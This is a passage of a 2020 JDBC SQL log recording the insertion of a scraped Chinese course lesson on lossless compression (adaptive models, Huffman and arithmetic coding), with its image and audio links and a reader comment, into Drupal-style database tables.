，这些字母将在待编码的数据中出现的概率是未知的，那么我们可以简单地认为“每个字母都已经出现了 1 次”：</span></span></span> </div> <div class="se-08bb6697" 
data-slate-type="image" data-slate-object="block" data-key="719"> <img class="se-e3166422" 
src="https://static001.geekbang.org/resource/image/4a/0f/4aa648466c77541dc3dbe492713a1c0f.jpg"> 
</div> <div class="se-8908d1aa " data-slate-type="paragraph" data-slate-object="block" data-key="720"> 
<span data-slate-object="text" data-key="721"><span data-slate-leaf="true" data-offset-key="721:0" 
data-first-offset="true"><span data-slate-string="true">那么，随着我们的编码流程向下进行，每次编码，或者每几次编码前这个概率统计，就会根据当前情况得到更新，再来指导下面的编码，不过算法和前面保持不变。</span></span></span> 
</div> <div class="se-3bdd7d08 " data-slate-type="paragraph" data-slate-object="block" data-key="722"> 
<span data-slate-object="text" data-key="723"><span data-slate-leaf="true" data-offset-key="723:0" 
data-first-offset="true"><span data-slate-string="true">比如读入第一个字符 e 以后，这个统计表格就变成了：</span></span></span> 
</div> <div class="se-9907c758" data-slate-type="image" data-slate-object="block" data-key="724"> 
<img class="se-121f8d8e" src="https://static001.geekbang.org/resource/image/eb/94/eb06f5f5601d6ceb251663c7b9530e94.jpg"> 
</div> <div class="se-e0cad127 " data-slate-type="paragraph" data-slate-object="block" data-key="725"> 
<span data-slate-object="text" data-key="726"><span data-slate-leaf="true" data-offset-key="726:0" 
data-first-offset="true"><span data-slate-string="true">再读入一个字符 a，这个统计表格就变成了：</span></span></span> 
</div> <div class="se-60805e3a" data-slate-type="image" data-slate-object="block" data-key="727"> 
<img class="se-a2e8b74b" src="https://static001.geekbang.org/resource/image/a3/80/a335ecf918c0e0dca74c479df9b37080.jpg"> 
</div> <div class="se-e88283f1 " data-slate-type="paragraph" data-slate-object="block" data-key="728"> 
<span data-slate-object="text" data-key="729"><span data-slate-leaf="true" data-offset-key="729:0" 
data-first-offset="true"><span data-slate-string="true">你看，随着编码的不断进行，这个统计表格会不断自我修正。如果源数据的字母分布在数据量增大的时候是收敛的，即不断趋近于某一个相应的比例，那么这个统计也会不断接近它，因此</span></span></span><span 
data-slate-object="text" data-key="730"><span data-slate-leaf="true" data-offset-key="730:0" 
data-first-offset="true"><span class="se-e833955b" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">随着时间的流逝，压缩工作的进行，压缩的效果会越来越好。</span></span></span></span> </div> <div 
class="se-64bb1d6d " data-slate-type="paragraph" data-slate-object="block" data-key="731"> 
<span data-slate-object="text" data-key="732"><span data-slate-leaf="true" data-offset-key="732:0" 
data-first-offset="true"><span class="se-098830ab" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">但是，在很多实际的场景中，这个分布统计并不是收敛的，而是随着时间的流逝会不断变化的。</span></span></span></span><span 
data-slate-object="text" data-key="733"><span data-slate-leaf="true" data-offset-key="733:0" 
data-first-offset="true"><span data-slate-string="true">举例来说，视频直播，随着播放的进行，统计数据需要时不时地发起更新，因为视频在不断变化，某一时间段内重复率高的数据串，可能到了下一个时间段内就变了。这时候，对于统计数据的生成就值得做文章了，比如我们可以选取一个适当的时间权重，</span></span></span><span 
data-slate-object="text" data-key="734"><span data-slate-leaf="true" data-offset-key="734:0" 
data-first-offset="true"><span class="se-34cea226" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">越是新的数据 ，权重越大，这种情况下我们得到的统计就具有一定的即时性了</span></span></span></span><span 
data-slate-object="text" data-key="735"><span data-slate-leaf="true" data-offset-key="735:0" 
data-first-offset="true"><span data-slate-string="true">，而一些较老的数据，显然对于统计分布的影响就很小了，而老到一定程度的数据，甚至就直接忽略掉好了。</span></span></span> 
</div> <div class="se-3993f1bd " data-slate-type="paragraph" data-slate-object="block" data-key="736"> 
<span data-slate-object="text" data-key="737"><span data-slate-leaf="true" data-offset-key="737:0" 
data-first-offset="true"><span data-slate-string="true">于是，通过这种方式，统计数据不断地随着实际数据流的变化而变化，那么编码的规则（编码表）就可以实现不断地自我调整，去适应数据的变化，这也是一些视频流编码都采用自适应模型的原因。</span></span></span> 
</div> <div class="se-1ac6f80a " data-slate-type="paragraph" data-slate-object="block" data-key="738"> 
<span data-slate-object="text" data-key="739"><span data-slate-leaf="true" data-offset-key="739:0" 
data-first-offset="true"><span data-slate-string="true">好，现在我们回过头来看看哈夫曼编码和算术编码，它们尽管在技术实现上有着诸多不同，但是它们的压缩过程，都包含了这样两个步骤，这也是大部分时候我们使用的压缩算法实际上所遵循的两个步骤：</span></span></span> 
</div> <div class="se-fbee8ae6" data-slate-type="list" data-slate-object="block" data-key="740"> 
<div class="se-a5e936e1 se-9544b3d0" data-slate-type="list-line" data-slate-object="block" 
data-key="741"> <span data-slate-object="text" data-key="742"><span data-slate-leaf="true" 
data-offset-key="742:0" data-first-offset="true"><span data-slate-string="true">第一步，分析并计算得到原始数据的统计模型；</span></span></span> 
</div> <div class="se-031327ad se-b0a774fe" data-slate-type="list-line" data-slate-object="block" 
data-key="743"> <span data-slate-object="text" data-key="744"><span data-slate-leaf="true" 
data-offset-key="744:0" data-first-offset="true"><span data-slate-string="true">第二步，根据统计模型，将相对较多出现的数据用较短的编码串表示，而较少出现的数据用较长的编码串表示。</span></span></span> 
</div> </div> <h2 class="se-37e6ebee" data-slate-type="heading" data-slate-object="block" data-key="745"><span 
data-slate-object="text" data-key="746"><span data-slate-leaf="true" data-offset-key="746:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-ae540629 " data-slate-type="paragraph" data-slate-object="block" data-key="747"> 
<span data-slate-object="text" data-key="748"><span data-slate-leaf="true" data-offset-key="748:0" 
data-first-offset="true"><span data-slate-string="true">今天我们学习了无损压缩算法中较为基础的几种，事实上，对于我们日常接触的那些实际的、商用的压缩算法，往往都是这些基础技术的综合使用。好，希望你已经理解了这些算法的本。</span></span></span> 
</div> <div class="se-84d4e7dd " data-slate-type="paragraph" data-slate-object="block" data-key="749"> 
<span data-slate-object="text" data-key="750"><span data-slate-leaf="true" data-offset-key="750:0" 
data-first-offset="true"><span data-slate-string="true">现在又到了提问时间：</span></span></span> </div> 
<div class="se-33ce4dd6" data-slate-type="list" data-slate-object="block" data-key="751"> <div 
class="se-495fb89f se-fd9827c7" data-slate-type="list-line" data-slate-object="block" data-key="752"> 
<span data-slate-object="text" data-key="753"><span data-slate-leaf="true" data-offset-key="753:0" 
data-first-offset="true"><span data-slate-string="true">对比哈夫曼编码和算术编码，你能否比较并分别说出二者的优劣？</span></span></span> 
</div> <div class="se-04fb4b6c se-f22a24c1" data-slate-type="list-line" data-slate-object="block" 
data-key="754"> <span data-slate-object="text" data-key="755"><span data-slate-leaf="true" 
data-offset-key="755:0" data-first-offset="true"><span data-slate-string="true">关于哈夫曼编码，如果编码后的串，其中的某个数值（无论是 
0 还是 1）丢失了，你觉得这样的数据损坏，会导致多大比例的数据无法被正确解码？</span></span></span> </div> </div> <div class="se-0ab0d128 
" data-slate-type="paragraph" data-slate-object="block" data-key="756"> <span data-slate-object="text" 
data-key="757"><span data-slate-leaf="true" data-offset-key="757:0" data-first-offset="true"><span 
data-slate-string="true">你可以回想一下上一讲的选修课堂，和本讲一样，都是将原数据进行某种特定的编码以后，得到目标数据，但是二者的目的是截然不同的，前者是为了加密，保护原始信息不被泄露、不被篡改，而后者是为了压缩，减少存储和传输数据的大小。</span></span></span> 
</div> <div class="se-9734f68f " data-slate-type="paragraph" data-slate-object="block" data-key="758"> 
<span data-slate-object="text" data-key="759"><span data-slate-leaf="true" data-offset-key="759:0" 
data-first-offset="true"><span data-slate-string="true">好，今天就到这里，不知道你是否在全栈开发的算法学习后有所收获，欢迎你和我分享你的思考。</span></span></span> 
</div> <h2 class="se-43e15df4" data-slate-type="heading" data-slate-object="block" data-key="760"><span 
data-slate-object="text" data-key="761"><span data-slate-leaf="true" data-offset-key="761:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-92acca3c" data-slate-type="list" data-slate-object="block" data-key="762"> <div class="se-db3ef86a 
se-7de49761" data-slate-type="list-line" data-slate-object="block" data-key="763"> <span data-slate-object="text" 
data-key="764"><span data-slate-leaf="true" data-offset-key="764:0" data-first-offset="true"><span 
data-slate-string="true">今天我介绍了几个较为基础和经典的无损压缩算法，你可以在这里查看无损压缩的</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="765" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="766"><span data-slate-leaf="true" data-offset-key="766:0" data-first-offset="true"><span 
data-slate-string="true">其它算法</span></span></span></a><span data-slate-object="text" data-key="767"><span 
data-slate-leaf="true" data-offset-key="767:0" data-first-offset="true"><span data-slate-string="true">。就如同软件开发没有银弹一样，不同的无损压缩算法擅长于不同的数据类型和特定的数据重复模式，没有一种通用的方法可以对所有的数据压缩都做到最好。</span></span></span> 
</div> <div class="se-403f2051 se-c61d5188" data-slate-type="list-line" data-slate-object="block" 
data-key="768"> <span data-slate-object="text" data-key="769"><span data-slate-leaf="true" 
data-offset-key="769:0" data-first-offset="true"><span data-slate-string="true">对于哈夫曼树的生成，这里有一个</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="770" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="771"><span data-slate-leaf="true" data-offset-key="771:0" 
data-first-offset="true"><span data-slate-string="true">网站</span></span></span></a><span data-slate-object="text" 
data-key="772"><span data-slate-leaf="true" data-offset-key="772:0" data-first-offset="true"><span 
data-slate-string="true">，可以根据你输入的字符串，图形化地展示哈夫曼树。</span></span></span> </div> <div class="se-8222b634 
se-43aba2e3" data-slate-type="list-line" data-slate-object="block" data-key="773"> <span data-slate-object="text" 
data-key="774"><span data-slate-leaf="true" data-offset-key="774:0" data-first-offset="true"><span 
data-slate-string="true">这两讲我介绍了一些全栈开发中重要的算法，但是还有许多其它很有意思、也很有地位的算法，推荐你阅读 InfoQ 上的这篇译文——</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="775" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="776"><span data-slate-leaf="true" data-offset-key="776:0" 
data-first-offset="true"><span data-slate-string="true">计算机科学中最重要的 32 个算法</span></span></span></a><span 
data-slate-object="text" data-key="777"><span data-slate-leaf="true" data-offset-key="777:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> </div> 
<div class="se-74e4e026" data-slate-type="image" data-slate-object="block" data-key="778"> 
<img class="se-3792e1c2" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 8, 8) 
 {executed in 8 msec}
2020-11-19 11:03:42.238 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=8 
 {executed in 0 msec}
2020-11-19 11:03:42.239 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:03:42.240 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=8 
 {executed in 0 msec}
2020-11-19 11:03:42.240 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:03:42.250 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605755022, 1605755022, 1, 'zh-hans', 0, 1, 1, 
0, '37丨全栈开发中的算法（下）', 1, 8, 8) 
 {executed in 9 msec}
2020-11-19 11:03:42.257 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=8 
 {executed in 0 msec}
2020-11-19 11:03:42.258 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:03:42.259 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605755022, 1605755022, 1, 'zh-hans', 0, 
1, 1, 0, '37丨全栈开发中的算法（下）', 'book', 1, 8, 8) 
 {executed in 1 msec}
2020-11-19 11:03:42.268 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.268 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:03:42.269 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.269 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:03:42.270 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/073aa0cc38c2d2bcdb172fb4eea1cfd7?bkt=en-24c643f198a62f882d36c825769542e0be93823e573f1a68e2aa9722ae1a3440b4f622ca0b415c66&fid=3757516097-778750-197714120192410&time=1605755020&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-oGNWjrgsBQqusomkTS5ueAokcOI%3D&to=92&size=12070980&sta_dx=12070980&sta_cs=2798&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575885223&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=12070980&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-17e584b59e6123d41847daba8a0f59ede7a5177c0cb8ae8fa913a84e0bc25de73723d5e1a81b8b05&sl=76480590&expires=8h&rt=pr&r=255287937&mlogid=7501971194276889374&vbdid=2247232042&fin=37%E4%B8%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8B%EF%BC%89.m4a&bflag=92,34-92&rtype=1&dp-logid=7501971194276889374&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=bae93ca4a6cd705e8b636555d6881f817fb5d23d20554830&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=37%E4%B8%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8B%EF%BC%89.m4a', 
8, 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.284 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.285 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:03:42.286 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/073aa0cc38c2d2bcdb172fb4eea1cfd7?bkt=en-24c643f198a62f882d36c825769542e0be93823e573f1a68e2aa9722ae1a3440b4f622ca0b415c66&fid=3757516097-778750-197714120192410&time=1605755020&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-oGNWjrgsBQqusomkTS5ueAokcOI%3D&to=92&size=12070980&sta_dx=12070980&sta_cs=2798&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575885223&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=12070980&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-17e584b59e6123d41847daba8a0f59ede7a5177c0cb8ae8fa913a84e0bc25de73723d5e1a81b8b05&sl=76480590&expires=8h&rt=pr&r=255287937&mlogid=7501971194276889374&vbdid=2247232042&fin=37%E4%B8%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8B%EF%BC%89.m4a&bflag=92,34-92&rtype=1&dp-logid=7501971194276889374&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=bae93ca4a6cd705e8b636555d6881f817fb5d23d20554830&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=37%E4%B8%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8B%EF%BC%89.m4a', 
8, 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.294 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.295 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:03:42.296 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=8 
 {executed in 1 msec}
2020-11-19 11:03:42.296 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:03:42.297 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-04 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 老师今天的课程应当是硬件存储的算法：记得徐文浩老师的《深入浅出计算机组成原理》里面有讲解。今天的课程是完全提及了我们日常会忽略的一个现状：一个程序的好坏其实要从软硬件两方面去考虑，往往我们经常忽略的是硬件层的情况。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;压缩很多种：有时存储时我们都会为了空间而适当转换，曾经和徐老师在课程中沟通过-深无底限。就像老师所说：没有最好，只有最合适当下业务场景。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <!----> <div 
class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> 
</div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class="">1</span> </div> <!----> 
</div> </div> </div></li>', 0, 'full_html', 'zh-hans', 8, 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.304 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=8 
 {executed in 1 msec}
2020-11-19 11:03:42.304 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:03:42.305 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-04 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 老师今天的课程应当是硬件存储的算法：记得徐文浩老师的《深入浅出计算机组成原理》里面有讲解。今天的课程是完全提及了我们日常会忽略的一个现状：一个程序的好坏其实要从软硬件两方面去考虑，往往我们经常忽略的是硬件层的情况。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;压缩很多种：有时存储时我们都会为了空间而适当转换，曾经和徐老师在课程中沟通过-深无底限。就像老师所说：没有最好，只有最合适当下业务场景。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <!----> <div 
class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> 
</div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class="">1</span> </div> <!----> 
</div> </div> </div></li>', 0, 'full_html', 'zh-hans', 8, 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.311 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=8 
 {executed in 1 msec}
2020-11-19 11:03:42.311 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:03:42.312 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.312 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:03:42.313 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 8, 'https://static001.geekbang.org/resource/image/d0/e1/d0e8e238f5b6f2243c0dcbfd851b6de1.jpg', 
8) 
 {executed in 0 msec}
2020-11-19 11:03:42.316 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.317 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:03:42.318 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 8, 'https://static001.geekbang.org/resource/image/d0/e1/d0e8e238f5b6f2243c0dcbfd851b6de1.jpg', 
8) 
 {executed in 0 msec}
2020-11-19 11:03:42.322 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.323 INFO  jdbc.resultsettable Line:610 - 
